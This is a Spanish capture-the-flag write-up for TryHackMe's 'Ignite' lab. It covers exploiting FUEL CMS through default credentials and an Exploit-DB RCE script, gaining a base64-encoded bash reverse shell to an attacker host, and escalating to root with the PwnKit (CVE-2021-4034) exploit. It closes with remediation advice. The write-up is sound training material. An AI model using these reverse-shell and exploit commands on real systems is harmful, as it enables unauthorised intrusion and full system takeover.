# Write-up: Ignite (TryHackMe) 
 
**Autor:** Juan Merino Garrido
**Plataforma:** TryHackMe 
**Máquina:** Ignite 
**Dificultad:** Fácil (con conceptos intermedios) 
 
Este write-up detalla un escenario de pentesting web completo, desde la enumeración de un CMS hasta la explotación manual de RCE y la escalada de privilegios con un exploit de kernel (PwnKit). 
 
--- 
 
## 1. Reconocimiento y Escaneo 
 
El escaneo inicial con `nmap` reveló un único puerto abierto. 
 
**Comando:** 
bash 
sudo nmap -sV -sC -p 80 <IP> 
 

Resultados Clave: 

    Puerto 80/tcp: HTTP (Apache httpd 2.4.18) 

Al visitar la página web, la pantalla de instalación reveló información crítica: 

    Nombre del CMS: FUEL CMS 

    Ruta de Admin: /fuel 

    Credenciales por Defecto: admin:admin 

 

## 2. Obtención de Acceso (Usuario 'www-data') 

Se probaron dos vectores de forma simultánea: 

Vector A: Acceso Autenticado 

Las credenciales por defecto admin:admin funcionaron en el panel /fuel, otorgando acceso autenticado. 

Vector B: Búsqueda de Exploits (Searchsploit) 

Sabiendo el nombre "FUEL CMS", se utilizó searchsploit: 

Bash 

    $ searchsploit "FUEL CMS" 
    ... 
    Fuel CMS 1.4.1 - Remote Code Execution (1) | php/webapps/47138.py 
    ... 
 

Se encontró un exploit de Ejecución Remota de Código (RCE). Se copió localmente con searchsploit -m php/webapps/47138.py. 

Modificación y Troubleshooting del Exploit 

El script 47138.py (escrito en Python 2) estaba hardcodeado para localhost y necesitaba modificaciones: 

    Se cambió la variable url por la IP de la víctima (http://<IP>). 

    Se eliminaron las líneas de proxy. 

El exploit permite enviar un comando al servidor. El primer intento (un payload bash -c '...') falló con un ParseError de PHP, ya que el servidor intentaba interpretar el comando bash como código PHP. 

La solución fue codificar el payload en Base64 para eliminar caracteres problemáticos: 

    Payload (Atacante): 

        echo "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1" | base64 -w 0 

        Salida: Ym... 

        Comando para la Víctima (en el prompt del exploit): 

        echo <PAYLOAD_BASE64> | base64 -d | bash 

Resultado: 

Se recibió una shell de netcat como el usuario www-data. 

Bash 

    $ nc -lnv 9001 
    connect to [<LHOST>] from [<IP>] 
    whoami 
    www-data 
 

La shell se estabilizó usando script /dev/null -c bash y el método stty raw -echo. 

 

## 3. Escalada de Privilegios (Root) 

Una vez dentro como www-data y con una TTY estable, comenzó la post-explotación. 

    Enumeración Automática (LinPEAS): 

        sudo -l pedía una contraseña. Se descargó linpeas.sh a /tmp. 

Bash 

    $ cd /tmp 
    $ wget [https://github.com/carlospolop/PEASS/releases/latest/download/linpeas.sh](https://github.com/carlospolop/PEASS/releases/latest/download/linpeas.sh) 
    $ chmod +x linpeas.sh 
    $ ./linpeas.sh 
 

Descubrimiento del Vector: 

LinPEAS identificó (en rojo y amarillo) que el sistema era vulnerable a [+] [CVE-2021-4034] PwnKit. 

Explotación de PwnKit 

Se descargó un exploit de PwnKit (CVE-2021-4034) de GitHub a la máquina Kali. 

Compilación (en Kali): 

El exploit venía en código C y se compiló según su README.md. 

    gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC 

Transferencia (de Kali a Víctima): 

Se inició un servidor Python (python3 -m http.server 8000) en Kali y se descargó el ejecutable PwnKit en la víctima. 

Bash 

    $ cd /tmp (en la víctima) 
    $ wget http://<LHOST>:8000/PwnKit 
 

Ejecución (en Víctima): 

Bash 

    $ chmod +x PwnKit 
    $ ./PwnKit 
    # whoami 
    root 
    # cat /root/root.txt 
    THM{...} 
 

El exploit se ejecutó con éxito, otorgando una shell de root inmediata. 

 

## 4. Conclusiones y Remediación 

    Credenciales por Defecto: El CMS seguía usando admin:admin. Solución: Siempre cambiar las contraseñas por defecto durante la instalación. 

    Sistema Desactualizado (PwnKit): La máquina no estaba parcheada contra CVE-2021-4034. Solución: Mantener el sistema y sus paquetes (polkit) actualizados es crítico. 

    Troubleshooting de Payloads: Este reto demostró la importancia de codificar payloads (Base64) para evadir filtros de sintaxis en RCE web. 
